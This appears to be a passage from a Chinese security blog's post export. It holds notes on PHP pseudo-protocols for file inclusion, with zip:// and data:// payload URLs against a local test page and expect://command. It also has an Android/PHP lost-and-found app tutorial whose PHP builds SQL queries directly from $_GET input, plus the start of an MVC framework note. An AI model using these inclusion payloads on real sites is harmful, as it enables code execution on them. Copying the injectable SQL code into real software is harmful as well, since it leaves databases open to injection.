<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/code/1.php?file=zip://E:\phpStudy\WWW\code/1.zip%231.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zip.png" alt=""></p>
<h2><span id="data协议">data://协议</span></h2><p>data://协议必须双在on才能正常使用；</p>
<ul>
<li><p>allow_url_fopen ：on</p>
</li>
<li><p>allow_url_include：on</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/code/1.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/code/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/data2.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/data1.png" alt=""></p>
<h2><span id="glob协议">glob://协议</span></h2><p>glob:// — 查找匹配的文件路径模式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$it = new DirectoryIterator($_GET[&apos;file&apos;]);</span><br><span class="line">foreach($it as $f) &#123;</span><br><span class="line">    printf(&quot;%s&quot;, $f-&gt;getFilename());</span><br><span class="line">	echo&apos;&lt;/br&gt;&apos;; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/glob.png" alt=""></p>
<h2><span id="expect协议">expect://协议</span></h2><p>expect:// — 处理交互式的流</p>
<p>该封装协议默认未开启<br>为了使用 expect:// 封装器，你必须安装 » PECL 上的 » Expect 扩展。</p>
<h3><span id="用法">用法</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expect://command</span><br></pre></td></tr></table></figure>
<h2><span id="reference">Reference</span></h2><p><a href="http://php.net" target="_blank" rel="noopener">PHP</a><br><a href="http://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">php伪协议实现命令执行的七种姿势</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Android App端与PHP Web端的简单数据交互实现]]></title>
      <url>https://uknowsec.cn/posts/notes/Android-App%E7%AB%AF%E4%B8%8EPHP-Web%E7%AB%AF%E7%9A%84%E7%AE%80%E5%8D%95%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92%E5%AE%9E%E7%8E%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>由于学校科技立项的项目需要实现Android App端与PHP Web端的简单数据交互的实现，当前场景是Web端使用的是MySql数据库，Apache服务器和PHP语言编写的。数据交互的简单理解就是Android能向服务端进行数据获取，同时也能进行数据提交。</p>
<h2><span id="实现流程">实现流程</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/webandorid%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt=""></p>
<h3><span id="流程说明">流程说明</span></h3><ul>
<li>Andorid Server端对MySql数据库进行简单的查询操作，并将查询数据结果转换为Json格式提供给Andorid利用OKhttp读取再解析Json展示到APP上；同时Andorid端利用OKhttp提交给Andorid Server端，由Server端对MySql数据库对提交数据的添加。</li>
<li>Apache Server端通过解析PHP源代码，对MySql数据库的增删查改显示在WebSite。</li>
</ul>
<h2><span id="具体实现">具体实现</span></h2><h3><span id="andorid-server">Andorid Server</span></h3><h4><span id="获取数据">获取数据</span></h4><p>get_all_found_items.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">header(&apos;Content-Type:text/html;charset=utf-8&apos;);/*设置php编码为utf-8*/</span><br><span class="line">/* </span><br><span class="line"> * Following code will list all the items </span><br><span class="line"> */  </span><br><span class="line">   </span><br><span class="line">// array for JSON response  </span><br><span class="line">$response = array();  </span><br><span class="line">   </span><br><span class="line">// include db connect class  </span><br><span class="line">require_once __DIR__ . &apos;/db_connect.php&apos;;  </span><br><span class="line">   </span><br><span class="line">// connecting to db  </span><br><span class="line">$db = new DB_CONNECT();  </span><br><span class="line">   </span><br><span class="line">// get all items from items table  </span><br><span class="line">$result = mysql_query(&quot;SELECT *FROM items WHERE type=&apos;1&apos;&quot;) or die(mysql_error());  </span><br><span class="line">// check for empty result  </span><br><span class="line">if (mysql_num_rows($result) &gt; 0) &#123;  </span><br><span class="line">    // looping through all results  </span><br><span class="line">    // items node  </span><br><span class="line">    $response[&quot;items&quot;] = array();  </span><br><span class="line">   </span><br><span class="line">    while ($row = mysql_fetch_array($result)) &#123;  </span><br><span class="line">        // temp user array  </span><br><span class="line">        $items = array();  </span><br><span class="line">        $items[&quot;what&quot;] = $row[&quot;what&quot;];  </span><br><span class="line">        $items[&quot;when&quot;] = $row[&quot;when&quot;];  </span><br><span class="line">        $items[&quot;where&quot;] = $row[&quot;where&quot;];  </span><br><span class="line">        $items[&quot;detail&quot;] = $row[&quot;detail&quot;];</span><br><span class="line">        $items[&quot;posttime&quot;] = $row[&quot;posttime&quot;];			</span><br><span class="line">		$resultcontcat = mysql_query(&quot;SELECT *FROM guests&quot;) or die(mysql_error()); </span><br><span class="line">		while ($row1 = mysql_fetch_array($resultcontcat)) &#123; </span><br><span class="line">			if ($row1[&quot;id&quot;] == $row[&quot;gid&quot;])&#123;</span><br><span class="line">				$items[&quot;contact&quot;] = $row1[&quot;contact&quot;];</span><br><span class="line">			&#125;</span><br><span class="line">			&#125;</span><br><span class="line">        // push single items into final response array  </span><br><span class="line">        array_push($response[&quot;items&quot;], $items);  </span><br><span class="line">    &#125;  </span><br><span class="line">    // success  </span><br><span class="line">    $response[&quot;success&quot;] = 1;  </span><br><span class="line">   </span><br><span class="line">    // echoing JSON response  </span><br><span class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE); </span><br><span class="line">&#125; else &#123;  </span><br><span class="line">    // no items found  </span><br><span class="line">    $response[&quot;success&quot;] = 0;  </span><br><span class="line">    $response[&quot;message&quot;] = &quot;No items found&quot;;  </span><br><span class="line">   </span><br><span class="line">    // echo JSON  </span><br><span class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>如以上PHP代码可知通过require_once()函数包含db_connect.php文件，执行数据库配置文件。定义数组\$response接收查询的数据结果，通过判断不同的情况赋值$response[“success”]，并返回到Web页面显示</p>
<p>PHP文件执行结果<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171023110706.png" alt=""></p>
<p>JSON<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;items&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;what&quot;: &quot;手表&quot;,</span><br><span class="line">            &quot;when&quot;: &quot;2017-10-21 00:00:00&quot;,</span><br><span class="line">            &quot;where&quot;: &quot;北区宿舍楼#504&quot;,</span><br><span class="line">            &quot;detail&quot;: &quot;白色的手表，XX品牌&quot;,</span><br><span class="line">            &quot;posttime&quot;: &quot;2017-10-21 13:03:09&quot;,</span><br><span class="line">            &quot;contact&quot;: &quot;138123456&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;what&quot;: &quot;手机&quot;,</span><br><span class="line">            &quot;when&quot;: &quot;2017-10-04 00:00:00&quot;,</span><br><span class="line">            &quot;where&quot;: &quot;北区商店#111&quot;,</span><br><span class="line">            &quot;detail&quot;: &quot;iphone6s,土豪金&quot;,</span><br><span class="line">            &quot;posttime&quot;: &quot;2017-10-21 13:03:46&quot;,</span><br><span class="line">            &quot;contact&quot;: &quot;137123456&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;what&quot;: &quot;电脑&quot;,</span><br><span class="line">            &quot;when&quot;: &quot;2017-10-21 14:39:54&quot;,</span><br><span class="line">            &quot;where&quot;: &quot;图书馆#203&quot;,</span><br><span class="line">            &quot;detail&quot;: &quot;联想品牌笔记本&quot;,</span><br><span class="line">            &quot;posttime&quot;: &quot;2017-10-21 17:08:14&quot;,</span><br><span class="line">            &quot;contact&quot;: &quot;5670001&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;what&quot;: &quot;细说PHP&quot;,</span><br><span class="line">            &quot;when&quot;: &quot;2017-09-21 13:03:46&quot;,</span><br><span class="line">            &quot;where&quot;: &quot;南馆#403&quot;,</span><br><span class="line">            &quot;detail&quot;: &quot;黑色封面，第二版《细说PHP》&quot;,</span><br><span class="line">            &quot;posttime&quot;: &quot;2017-10-21 17:36:53&quot;,</span><br><span class="line">            &quot;contact&quot;: &quot;63513641&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;success&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4><span id="提交数据">提交数据</span></h4><p>create_found_items.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">header(&apos;Content-Type:text/html;charset=utf-8&apos;);/*设置php编码为utf-8*/   </span><br><span class="line">/* </span><br><span class="line"> * Following code will create a new product row </span><br><span class="line"> * All product details are read from HTTP GET Request </span><br><span class="line"> */  </span><br><span class="line">   </span><br><span class="line">// array for JSON response  </span><br><span class="line">$response = array();  </span><br><span class="line">   </span><br><span class="line">// check for required fields  </span><br><span class="line">if (isset($_GET[&apos;what&apos;]) &amp;&amp; isset($_GET[&apos;when&apos;]) &amp;&amp; isset($_GET[&apos;where&apos;]) &amp;&amp; isset($_GET[&apos;detail&apos;])&amp;&amp; isset($_GET[&apos;contact&apos;])) &#123;  </span><br><span class="line">   </span><br><span class="line">    $what = $_GET[&apos;what&apos;];  </span><br><span class="line">    $when = $_GET[&apos;when&apos;];  </span><br><span class="line">    $where = $_GET[&apos;where&apos;];  </span><br><span class="line">    $detail = $_GET[&apos;detail&apos;]; </span><br><span class="line">    $contact = $_GET[&apos;contact&apos;];	</span><br><span class="line">	</span><br><span class="line">    // include db connect class  </span><br><span class="line">    require_once __DIR__ . &apos;/db_connect.php&apos;;  </span><br><span class="line">   </span><br><span class="line">    // connecting to db  </span><br><span class="line">    $db = new DB_CONNECT();  </span><br><span class="line">   </span><br><span class="line">    // mysql inserting a new row  </span><br><span class="line">	$result2 = mysql_query(&quot;INSERT INTO guests(contact) VALUES(&apos;$contact&apos;)&quot;);  </span><br><span class="line">	$gidresult = mysql_query(&quot;SELECT id FROM `guests` WHERE contact=&apos;$contact&apos;&quot;);	</span><br><span class="line">	while ($row = mysql_fetch_array($gidresult)) &#123; </span><br><span class="line">			$gid=$row[&apos;id&apos;];</span><br><span class="line">		&#125;</span><br><span class="line">    $result1 = mysql_query(&quot;INSERT INTO items(`what`, `when`, `where`, `type` ,`gid`, `detail`) VALUES(&apos;$what&apos;, &apos;$when&apos;, &apos;$where&apos;, &apos;1&apos;, &apos;$gid&apos;, &apos;$detail&apos;)&quot;);   </span><br><span class="line">   </span><br><span class="line">    // check if row inserted or not  </span><br><span class="line">    if ($result1 &amp;&amp; $result2) &#123;  </span><br><span class="line">        // successfully inserted into database  </span><br><span class="line">        $response[&quot;success&quot;] = 1;  </span><br><span class="line">        $response[&quot;message&quot;] = &quot;Items successfully created.&quot;;  </span><br><span class="line">   </span><br><span class="line">        // echoing JSON response  </span><br><span class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);   </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        // failed to insert row  </span><br><span class="line">        $response[&quot;success&quot;] = 0;  </span><br><span class="line">        $response[&quot;message&quot;] = &quot;Oops! An error occurred.&quot;;  </span><br><span class="line">   </span><br><span class="line">        // echoing JSON response  </span><br><span class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; else &#123;  </span><br><span class="line">    // required field is missing  </span><br><span class="line">    $response[&quot;success&quot;] = 0;  </span><br><span class="line">    $response[&quot;message&quot;] = &quot;Required field(s) is missing&quot;;  </span><br><span class="line">   </span><br><span class="line">    // echoing JSON response  </span><br><span class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);   </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>判断GET请求的参数是否都存在，把获取的GET请求参数作为数据INSERT TO MySQL数据库。判断INSERT执行过程赋值\$response[“success”]对应相应的$response[“message”]，显示在Web页面。</p>
<p>执行结果<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720171023111323_%E7%9C%8B%E5%9B%BE%E7%8E%8B.png" alt=""></p>
<h3><span id="andorid">Andorid</span></h3><h4><span id="获取数据">获取数据</span></h4><p>核心代码 queryLosts()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">private void queryLosts() &#123;</span><br><span class="line">	losts.clear();</span><br><span class="line">	new Thread(new Runnable() &#123;</span><br><span class="line">		</span><br><span class="line">		@Override</span><br><span class="line">		public void run() &#123;</span><br><span class="line">			// TODO Auto-generated method stub</span><br><span class="line">			</span><br><span class="line">	        OkHttpClient okHttpClient = new OkHttpClient();</span><br><span class="line">	        String url = &quot;http://webSite/androidapi/get_all_lost_items.php&quot;;</span><br><span class="line">	        Request request = new Request.Builder()</span><br><span class="line">	                .url(url)</span><br><span class="line">	                .build();</span><br><span class="line">	        Call call = okHttpClient.newCall(request);</span><br><span class="line">	        try &#123;</span><br><span class="line">	            Response response = call.execute();</span><br><span class="line">	            String res = response.body().string();</span><br><span class="line">	            if (res != null &amp;&amp; !res.trim().equals(&quot;&quot;))&#123;</span><br><span class="line">	                JSONObject jsonObject = new JSONObject(res);</span><br><span class="line">	                if (jsonObject.getInt(&quot;success&quot;) == 1)&#123;</span><br><span class="line">	                    JSONArray jsonArray = jsonObject.getJSONArray(&quot;items&quot;);</span><br><span class="line">	                    for (int i = jsonArray.length() - 1;i &gt;= 0;i--)&#123;</span><br><span class="line">	                        JSONObject item = jsonArray.getJSONObject(i);</span><br><span class="line">	                        String what = null;</span><br><span class="line">	                        try &#123;</span><br><span class="line">	                            what = item.getString(&quot;what&quot;);</span><br><span class="line">	                        &#125;catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">	                        &#125;</span><br><span class="line">	                        String when = null;</span><br><span class="line">	                        try&#123;</span><br><span class="line">	                            when = item.getString(&quot;when&quot;);</span><br><span class="line">	                        &#125;catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">	                        &#125;</span><br><span class="line">	                        String where = null;</span><br><span class="line">	                        try&#123;</span><br><span class="line">	                            where = item.getString(&quot;where&quot;);</span><br><span class="line">	                        &#125;catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">	                        &#125;</span><br><span class="line">	                        String detail = null;</span><br><span class="line">	                        try &#123;</span><br><span class="line">	                            detail = item.getString(&quot;detail&quot;);</span><br><span class="line">	                        &#125;catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">	                        &#125;</span><br><span class="line">	                        String contact = null;</span><br><span class="line">	                        try &#123;</span><br><span class="line">	                            contact = item.getString(&quot;contact&quot;);</span><br><span class="line">	                        &#125;catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">	                        &#125;</span><br><span class="line">	                        Lost lost = new Lost();</span><br><span class="line">	                        lost.setTitle(what);</span><br><span class="line">	                        String des = &quot;地点：&quot; + (where == null?&quot;&quot;:where) +&quot;     &quot;+&quot;时间：&quot; + (when == null?&quot;&quot;:when)+&quot;\r&quot; + &quot;     &quot;+&quot;描述：&quot; + (detail == null?&quot;&quot;:detail);</span><br><span class="line">	                        lost.setDescribe(des);</span><br><span class="line">	                        lost.setPhone(contact == null?&quot;&quot;:contact);</span><br><span class="line">	                        losts.add(lost);</span><br><span class="line">	                    &#125;</span><br><span class="line">	                &#125;</span><br><span class="line">	            &#125;</span><br><span class="line">	        &#125; catch (Exception e) &#123;</span><br><span class="line">	            e.printStackTrace();</span><br><span class="line">	            showErrorView(0);</span><br><span class="line"></span><br><span class="line">	        &#125;</span><br><span class="line">	        if (losts == null || losts.size() == 0) &#123;</span><br><span class="line">	        	handler.sendEmptyMessage(1);</span><br><span class="line">	            return;</span><br><span class="line">	        &#125;</span><br><span class="line">	        if (losts.size() &gt; 0)&#123;</span><br><span class="line">	           handler.sendEmptyMessage(2);</span><br><span class="line">	        &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;).start();</span><br></pre></td></tr></table></figure>
<p>利用Android网络框架OKhttp,OKhttp一个处理网络请求的开源项目,是安卓端最火热的轻量级框架.请求接口url地址，获取Json数据利用JSONObject对Json数据进行解析。</p>
<h4><span id="提交数据">提交数据</span></h4><p>核心代码 addLost()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public Handler handler = new Handler()&#123;</span><br><span class="line"></span><br><span class="line">	public void handleMessage(android.os.Message msg) &#123;</span><br><span class="line">		switch(msg.what)&#123;</span><br><span class="line">			case 1:</span><br><span class="line">				Toast.makeText(this,&quot;提交成功&quot;,Toast.LENGTH_LONG).show();</span><br><span class="line">				break;</span><br><span class="line">			case 2:</span><br><span class="line">				Toast.makeText(this,&quot;提交失败&quot;,Toast.LENGTH_LONG).show();</span><br><span class="line">				break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">private void addLost()&#123;</span><br><span class="line">	OkHttpClient okHttpClient = new OkHttpClient();</span><br><span class="line">	String url =&quot;http://website/androidapi/create_lost_items.php?what=&quot;+title+&quot;&amp;when=&quot;+time+&quot;&amp;where=&quot;+place+&quot;&amp;detail=&quot;+describe+&quot;&amp;contact=&quot;+photo+&quot;&quot;;</span><br><span class="line">	Request request = new Request.Builder()</span><br><span class="line">			.url(url)</span><br><span class="line">			.build();</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	try&#123;</span><br><span class="line">		Response response = okHttpClient.newCall(request).execute();</span><br><span class="line">		res = response.body().string();</span><br><span class="line">		handler.sendEmptyMessage(1);</span><br><span class="line">	&#125;catch (Exception e)</span><br><span class="line">	&#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		handler.sendEmptyMessage(2);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样利用Okhttp,GET方式提交参数，try-catch获取异常，通过返回值给出一定的提交结果提示。</p>
<h2><span id="代码测试">代码测试</span></h2><h3><span id="数据同步">数据同步</span></h3><h4><span id="web端">Web端</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171023112834.png" alt=""></p>
<h4><span id="andorid端">Andorid端</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720171023112949.jpg" alt=""></p>
<h3><span id="数据提交">数据提交</span></h3><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720171023113352.jpg" alt=""></p>
<p>提交结果</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/Screenshot_2017-10-23-11-42-14-803_com.bmob.lostf.jpg" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171023114405.png" alt=""></p>
<h2><span id="结语">结语</span></h2><p>以上过程基本实现，项目基本上可以交差了。这个项目PHP部分主要是由自己在弄，也是边学边做。Android方面是另外一个同学主要负责，期间也求助过我实习时结交的朋友帮助。感谢所有付出与帮助的人。</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP MVC开发框架学习笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/PHP-MVC%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="mvc">MVC</span></h2><p>MVC模式（Model-View-Controller）是软件工程中的一种软件架构模式，把软件系统分为三个基本部分：模型（Model）、视图（View）和控制器（Controller）。</p>
<p>PHP中MVC模式也称Web MVC，从上世纪70年代进化而来。MVC的目的是实现一种动态的程序设计，便于后续对程序的修改和扩展简化，并且使程序某一部分的重复利用成为可能。除此之外，此模式通过对复杂度的简化，使程序结构更加直观。软件系统通过对自身基本部份分离的同时，也赋予了各个基本部分应有的功能。</p>
<h3><span id="mvc各部分的职能">MVC各部分的职能</span></h3><p>MVC各部分的职能：</p>
<ul>
<li>模型Model – 管理大部分的业务逻辑和所有的数据库逻辑。模型提供了连接和操作数据库的抽象层。</li>
<li>控制器Controller - 负责响应用户请求、准备数据，以及决定如何展示数据。</li>
<li>视图View – 负责渲染数据，通过HTML方式呈现给用户。</li>
</ul>
<h3><span id="mvc流程">MVC流程</span></h3><p>一个典型的Web MVC流程：</p>
<ul>
<li>Controller截获用户发出的请求；</li>
<li>Controller调用Model完成状态的读写操作；</li>
<li>Controller把数据传递给View；</li>
<li>View渲染最终结果并呈献给用户。</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/web_mvc.gif" alt=""></p>
<h2><span id="mvc框架开发">MVC框架开发</span></h2><h3><span id="目录准备">目录准备</span></h3><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/mvc1.png" alt=""></p>
<h3><span id="目录的作用">目录的作用</span></h3><ul>
<li>application – 应用代码</li>
<li>config – 程序配置或数据库配置</li>
<li>myphp - 框架核心目录</li>
<li>public – 静态文件</li>
<li>runtime - 临时数据目录</li>
</ul>
<h3><span id="代码规范">代码规范</span></h3><ul>
<li>MySQL的表名需小写，如：item，car</li>
<li>模块名（Models）需首字母大写，，并在名称后添加“Model”，如：ItemModel，CarModel</li>
<li>控制器（Controllers）需首字母大写，，并在名称中添加“Controller”，如：ItemController，CarController</li>
<li>视图（Views）部署结构为“控制器名/行为名”，如：item/view.php，car/buy.php</li>
</ul>
<h3><span id="重定向">重定向</span></h3><p>将所有的数据请求都重定向 index.php 文件，在 myphp-frame 目录下新建一个 .htaccess 文件，文件内容为：</p>
